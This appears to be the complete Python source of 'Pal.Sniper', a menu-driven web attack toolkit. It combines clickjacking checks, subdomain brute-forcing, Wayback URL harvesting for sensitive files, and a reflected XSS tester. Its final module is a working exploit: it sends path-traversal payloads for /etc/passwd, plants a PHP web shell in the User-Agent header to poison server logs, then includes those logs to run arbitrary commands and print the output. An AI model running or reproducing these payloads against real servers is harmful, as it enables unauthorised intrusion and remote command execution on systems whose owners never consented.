import requests
import time
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import os
from urllib.parse import urlencode, urlparse, parse_qs, quote
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import WebDriverException, SessionNotCreatedException

# --- Helper for beautiful printing ---
def print_banner():
    print("\n" + "="*50)
    print(" _______   _         ._______ .______  .______   ")
    print("|    ___|_| |_ ____ _|_     _||   _  | |   _  \\  ")
    print("|    ___|_     _| __|_|    |  |  |_)  | |  |_)  | ")
    print("|_______|  |_| |____| |____|  |______/  |______/  ")
    print("                                                  ")
    print("      ✨ Pal.Sniper - Multi-Security Tool ✨")
    print("="*50)

def print_separator(title=""):
    print("\n" + "-"*50)
    if title:
        print(f"--- {title} ---")
        print("-" * 50)
    else:
        print("-" * 50)

# --- Tool 1: Clickjacking Check ---

def run_clickjacking_checker():
    print_separator("Clickjacking Protection Check")
    domains_file = input("Enter domain file name (e.g., domains.txt): ")

    if not os.path.exists(domains_file):
        print(f"[!] Error: File '{domains_file}' not found.")
        return

    def check_clickjacking_single_url(url):
        try:
            r = requests.get(url, timeout=5)
            xfo = r.headers.get('X-Frame-Options', '').lower()
            csp = r.headers.get('Content-Security-Policy', '').lower()
            if 'frame-ancestors' in csp:
                if 'none' in csp:
                    return 'Protected (CSP: frame-ancestors none)', xfo, csp
                else:
                    return 'Protected (CSP: frame-ancestors)', xfo, csp
            elif 'deny' in xfo or 'sameorigin' in xfo:
                return 'Protected (X-Frame-Options)', xfo, csp
            else:
                return 'Vulnerable', xfo, csp
        except requests.exceptions.RequestException as e:
            return f'Connection error: {e}', '', ''
        except Exception as e:
            return f'Unexpected error: {e}', '', ''

    urls = []
    with open(domains_file, 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]

    results = []
    print(f"[*] Scanning {len(urls)} URLs for Clickjacking vulnerability...")
    for url in urls:
        print(f"[*] Checking: {url}...")
        status, xfo, csp = check_clickjacking_single_url(url)
        results.append({
            'url': url,
            'status': status,
            'xfo': xfo,
            'csp': csp
        })

    report_filename = 'clickjacking_report.html'
    html = '''<!DOCTYPE html>
    <html>
    <head>
    <title>Clickjacking Protection Report</title>
    <style>
    body { font-family: Arial; background: #1a1a2e; color: #e0e0e0; margin: 20px; }
    h2 { color: #0f4c75; text-align: center; margin-bottom: 30px; }
    table { width: 90%; border-collapse: collapse; margin: 0 auto; background: #2e2e4a; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }
    th, td { padding: 12px 15px; border: 1px solid #4a4a6b; text-align: left; }
    th { background: #3a3a5e; color: #fff; font-weight: bold; }
    tr:nth-child(even) { background: #26263e; }
    .protected { color: #00FF00; font-weight: bold; }
    .vulnerable { color: #FF6347; font-weight: bold; }
    .error { color: #FFD700; font-weight: bold; }
    </style>
    </head>
    <body>
    <h2>Clickjacking Protection Report</h2>
    <table>
    <tr><th>URL</th><th>Status</th><th>X-Frame-Options</th><th>Content-Security-Policy</th></tr>
    '''
    for res in results:
        status_class = ''
        if 'Protected' in res['status']:
            status_class = 'protected'
        elif 'Vulnerable' in res['status']:
            status_class = 'vulnerable'
        elif 'error' in res['status'].lower():
            status_class = 'error'

        html += f"<tr><td>{res['url']}</td><td class='{status_class}'>{res['status']}</td><td>{res['xfo'] or 'N/A'}</td><td>{res['csp'] or 'N/A'}</td></tr>"
    html += '</table></body></html>'

    with open(report_filename, 'w', encoding='utf-8') as f:
        f.write(html)
    print(f"[+] Clickjacking report generated: {report_filename}")

# --- End of Tool 1 ---

# --- Tool 2: Subdomain Scanner ---

def run_subdomain_scanner():
    print_separator("Subdomain Scanner")
    domains_file = input("Enter main domains file (e.g., domains.txt): ")
    subdomains_file = input("Enter subdomains file (e.g., subdomains.txt): ")

    if not os.path.exists(domains_file):
        print(f"[!] Error: File '{domains_file}' not found.")
        return
    if not os.path.exists(subdomains_file):
        print(f"[!] Error: File '{subdomains_file}' not found.")
        return

    def load_list_from_file(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

    live_subdomains_filename = 'live_subdomains.txt'
    if os.path.exists(live_subdomains_filename):
        os.remove(live_subdomains_filename)

    def log_result(message):
        with open(live_subdomains_filename, 'a', encoding='utf-8') as f:
            f.write(message + "\n")

    def get_status_color(status):
        if 200 <= status < 300:
            return "#4CAF50"  # Green
        elif 300 <= status < 400:
            return "#FFC107"  # Yellow
        else:
            return "#F44336"  # Red

    subdomain_report_filename = 'subdomain_scan_report.html'
    if os.path.exists(subdomain_report_filename):
        os.remove(subdomain_report_filename)

    def log_to_html_row(url, status, response_time):
        color = get_status_color(status)
        with open(subdomain_report_filename, "a", encoding='utf-8') as f:
            f.write(f"<tr style='color:{color}'><td>{url}</td><td>{status}</td><td>{response_time:.2f} ms</td></tr>\n")

    def init_html_report():
        with open(subdomain_report_filename, "w", encoding='utf-8') as f:
            f.write("""<!DOCTYPE html>
    <html>
    <head>
    <title>Subdomain Scan Report</title>
    <style>
    body { font-family: Arial; background: #1a1a2e; color: #e0e0e0; margin: 20px; }
    h2 { color: #0f4c75; text-align: center; margin-bottom: 30px; }
    table { width: 90%; border-collapse: collapse; margin: 0 auto; background: #2e2e4a; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }
    th, td { padding: 12px 15px; border: 1px solid #4a4a6b; text-align: left; }
    th { background: #3a3a5e; color: #fff; font-weight: bold; }
    tr:nth-child(even) { background: #26263e; }
    </style>
    </head>
    <body>
    <h2>📄 Subdomain Scan Report</h2>
    <table>
    <tr><th>URL</th><th>Status Code</th><th>Response Time</th></tr>
    """)

    def close_html_report():
        with open(subdomain_report_filename, "a", encoding='utf-8') as f:
            f.write("</table></body></html>")

    def scan_single_subdomain(domain, sub):
        for proto in ['http', 'https']:
            url = f"{proto}://{sub}.{domain}"
            try:
                start_time = time.time()
                r = requests.get(url, timeout=5)
                elapsed = (time.time() - start_time) * 1000
                msg = f"[+] Live: {url} ({r.status_code}) - {elapsed:.2f} ms"
                print(msg)
                log_result(msg)
                log_to_html_row(url, r.status_code, elapsed)
            except requests.exceptions.RequestException:
                pass
            except Exception as e:
                pass

    def scan_all_domains(domains, subdomains, max_threads=50):
        total_checks = len(domains) * len(subdomains) * 2
        print(f"[*] Scanning {total_checks} potential subdomains...")
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for domain in domains:
                for sub in subdomains:
                    futures.append(executor.submit(scan_single_subdomain, domain, sub))
            for i, future in enumerate(futures):
                future.result()
                # Optional progress printing here

    domains = load_list_from_file(domains_file)
    subdomains = load_list_from_file(subdomains_file)
    init_html_report()
    scan_all_domains(domains, subdomains)
    close_html_report()
    print(f"[+] Subdomain report generated: {subdomain_report_filename}")
    print(f"[+] Text results saved to: {live_subdomains_filename}")

# --- End of Tool 2 ---

# --- Tool 3: Wayback Machine Endpoint Extractor ---

def run_wayback_endpoint_extractor():
    print_separator("Wayback Machine Endpoint Extractor")
    domain_to_scan = input("Enter target domain (e.g., example.com): ")

    extract_endpoints_choice = input("Extract endpoints from archived HTML pages? (yes/no): ").lower()
    enable_extract_endpoints = extract_endpoints_choice == 'yes'

    default_filter_ext = [
        ".php", ".bak", ".env", ".html", ".asp", ".aspx", ".js", ".json", ".txt", ".log",
        ".conf", ".xml", ".yml", ".ini", ".db", ".zip", ".tar", ".gz", ".rar", ".sql",
        ".csv", ".swp", ".old", ".backup", ".inc", ".cgi", ".pl", ".jsp", ".jspx",
        ".wsdl", ".config", ".phtml", ".shtml", ".sh", ".bat", ".ps1", ".md", ".pdf",
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx"
    ]
    
    change_filters = input("Customize file extensions filter? (yes/no - default: comprehensive): ").lower()
    if change_filters == 'yes':
        custom_extensions_input = input("Enter comma-separated extensions (e.g., .js,.css,.php): ")
        filter_ext_list = [ext.strip() for ext in custom_extensions_input.split(',') if ext.strip()]
        if not filter_ext_list:
            print("[!] No custom extensions entered, using defaults.")
            filter_ext_list = default_filter_ext
    else:
        filter_ext_list = default_filter_ext

    contains_text = input("Enter text to include in URLs (optional, press Enter to skip): ").strip()
    
    def extract_endpoints_from_html(url):
        try:
            resp = requests.get(url, timeout=7)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'html.parser')
                endpoints = set()
                for tag in soup.find_all(['a', 'form', 'script']):
                    if tag.name == 'a' and tag.get('href'):
                        endpoints.add(tag['href'])
                    elif tag.name == 'form' and tag.get('action'):
                        endpoints.add(tag['action'])
                    elif tag.name == 'script' and tag.get('src'):
                        endpoints.add(tag['src'])
                return endpoints
        except Exception as e:
            return set()

    def get_wayback_urls_inner(domain, filter_ext=None, contains=None, extract_endpoints=False):
        base = "http://web.archive.org/cdx/search/cdx"
        params = {
            "url": f"{domain}/*",
            "output": "json",
            "collapse": "urlkey"
        }

        all_extracted_endpoints = set()
        wayback_urls_found = []

        try:
            print(f"[*] Retrieving archived URLs for: {domain}")
            r = requests.get(base, params=params, timeout=10)
            if r.status_code != 200:
                print(f"[!] Error fetching data from Wayback Machine: {r.status_code}")
                return [], set()

            results = r.json()
            if not results or len(results) < 2:
                print("[!] No archived URLs found for this domain.")
                return [], set()

            urls = [row[2] for row in results[1:]]
            
            if filter_ext:
                urls = [u for u in urls if u.lower().endswith(tuple(filter_ext))]
            if contains_text:
                urls = [u for u in urls if contains_text.lower() in u.lower()]

            print(f"[+] Found {len(urls)} archived URLs.")
            wayback_urls_found.extend(urls)

            for url in urls:
                print(f"  [URL] {url}")
                if extract_endpoints and url.lower().endswith(('.html', '.php', '.asp', '.aspx', '/')):
                    endpoints = extract_endpoints_from_html(url)
                    for ep in endpoints:
                        print(f"    [ENDPOINT] {ep}")
                        all_extracted_endpoints.add(ep)
            
            return wayback_urls_found, all_extracted_endpoints

        except Exception as e:
            print(f"[!] Error: {e}")
        return [], set()

    wayback_urls, extracted_endpoints = get_wayback_urls_inner(
        domain_to_scan,
        filter_ext=filter_ext_list,
        contains=contains_text if contains_text else None,
        extract_endpoints=enable_extract_endpoints
    )

    wayback_report_filename = f'wayback_report_{domain_to_scan.replace(".", "_")}.txt'
    with open(wayback_report_filename, 'w', encoding='utf-8') as f:
        f.write(f"Wayback URLs for: {domain_to_scan}\n")
        f.write("-------------------------------------\n")
        for url in wayback_urls:
            f.write(f"{url}\n")
        
        if extracted_endpoints:
            f.write("\nExtracted Endpoints:\n")
            f.write("---------------------\n")
            for ep in extracted_endpoints:
                f.write(f"{ep}\n")
    print(f"[+] Wayback report generated: {wayback_report_filename}")

# --- End of Tool 3 ---

# --- Tool 4: XSS Scanner ---

def run_xss_scanner():
    print_separator("Reflected XSS Scanner")
    target_url = input("Enter target URL (e.g., https://example.com/search): ")
    param_name = input("Enter parameter name to test (e.g., q): ")

    chrome_options = Options()
    chrome_options.headless = True
    chrome_options.add_argument('--log-level=3')
    browser = None
    try:
        browser = webdriver.Chrome(options=chrome_options)
    except (WebDriverException, SessionNotCreatedException) as e:
        print(f"[!] Chrome browser error. Please ensure:")
        print(f"  1. Google Chrome is installed")
        print(f"  2. Correct ChromeDriver version is installed")
        print(f"  3. ChromeDriver is in PATH or script directory")
        print(f"  Error: {e}")
        return

    def xss_test(url, param, browser_instance):
        payload = "<svg/onload=alert(1)>"
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        query_params[param] = [payload]
        
        encoded_query = urlencode(query_params, doseq=True)
        full_url = parsed_url._replace(query=encoded_query).geturl()

        xss_found = False
        screenshot_filename = ""

        print(f"[*] Testing XSS on: {full_url}")
        try:
            r = requests.get(full_url, timeout=7)
            if payload in r.text:
                print(f"[+] Potential reflected XSS: {full_url}")
                xss_found = True
                try:
                    browser_instance.get(full_url)
                    screenshot_filename = f"xss_screenshot_{int(time.time())}.png"
                    browser_instance.save_screenshot(screenshot_filename)
                    print(f"  [+] Screenshot saved: {screenshot_filename}")
                except WebDriverException as e:
                    print(f"  [!] Screenshot error: {e}")
            else:
                print(f"[-] No reflected XSS found: {full_url}")
        except Exception as e:
            print(f"  [!] Error: {e}")
        
        return xss_found, full_url, screenshot_filename

    xss_test(target_url, param_name, browser)

    if browser:
        browser.quit()
        print("[*] Chrome browser closed.")

# --- End of Tool 4 ---

# --- Tool 5: LFI & Log Poisoning Scanner ---

def run_lfi_log_poisoning_scanner():
    print_separator("LFI & Log Poisoning Scanner")
    base_url = input("Enter base URL (e.g., https://example.com/view): ")
    param = input("Enter parameter name to test (e.g., file): ")

    def lfi_test_inner(base_url, param):
        payloads = [
            "../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "/etc/hosts",
            "C:\\windows\\win.ini"
        ]
        
        print(f"[*] Testing LFI on {base_url} with parameter {param}...")
        lfi_found = False
        for payload in payloads:
            url = f"{base_url}?{param}={quote(payload)}"
            try:
                r = requests.get(url, timeout=7)
                if "root:x:" in r.text or "[fonts]" in r.text or "nobody:" in r.text:
                    print(f"[+] LFI Detected: {url}")
                    lfi_found = True
                else:
                    print(f"[-] No LFI detected: {url}")
            except Exception as e:
                pass
        return lfi_found

    def log_poisoning_test_inner(base_url, param):
        log_files = [
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log",
            "/xampp/apache/logs/access.log",
            "C:/xampp/apache/logs/access.log",
            "../../../apache/logs/access.log",
            "/proc/self/environ",
            "/var/log/auth.log"
        ]
        
        cmd_to_execute = input("Enter command to execute (e.g., id or whoami): ")
        if not cmd_to_execute:
            cmd_to_execute = "id"

        payload = "<?php system($_GET['cmd']); ?>"
        poisoned_header = {"User-Agent": payload}
        
        print("\n[*] Attempting log poisoning...")
        try:
            requests.get(base_url, headers=poisoned_header, timeout=5)
            print(f"[+] Poison payload sent to {base_url}")
        except Exception as e:
            print("  [!] Log poisoning attempt failed")

        print("\n[*] Attempting log exploitation...")
        log_poisoning_successful = False
        for log_file in log_files:
            try:
                poisoned_url = f"{base_url}?{param}={quote(log_file)}&cmd={quote(cmd_to_execute)}"
                print(f"  Testing: {poisoned_url}")
                r = requests.get(poisoned_url, timeout=7)
                
                if "uid=" in r.text or "gid=" in r.text or "root" in r.text or cmd_to_execute in r.text:
                    print(f"\n[+] Log Poisoning Successful: {poisoned_url}")
                    print(f"[+] Output:\n{r.text.strip()}")
                    log_poisoning_successful = True
            except Exception as e:
                pass
        
        if not log_poisoning_successful:
            print("[-] No successful log poisoning detected")

    lfi_test_inner(base_url, param)
    print("\n" + "="*50 + "\n")
    log_poisoning_test_inner(base_url, param)
    print("\n[*] LFI & Log Poisoning scan completed")

# --- End of Tool 5 ---

# --- Main Menu ---

def main_tool():
    while True:
        print_banner()
        print("1. Clickjacking Protection Check")
        print("2. Subdomain Scanner")
        print("3. Wayback Machine Endpoint Extractor")
        print("4. Reflected XSS Scanner")
        print("5. LFI & Log Poisoning Scanner")
        print("6. Exit")
        print("="*50)

        choice = input("Select tool number: ")

        if choice == '1':
            run_clickjacking_checker()
        elif choice == '2':
            run_subdomain_scanner()
        elif choice == '3':
            run_wayback_endpoint_extractor()
        elif choice == '4':
            run_xss_scanner()
        elif choice == '5':
            run_lfi_log_poisoning_scanner()
        elif choice == '6':
            print("\nThank you for using Pal.Sniper. Goodbye!")
            break
        else:
            print("[!] Invalid choice. Please enter 1-6")
        
        input("\nPress Enter to return to menu...")

if __name__ == "__main__":
    main_tool()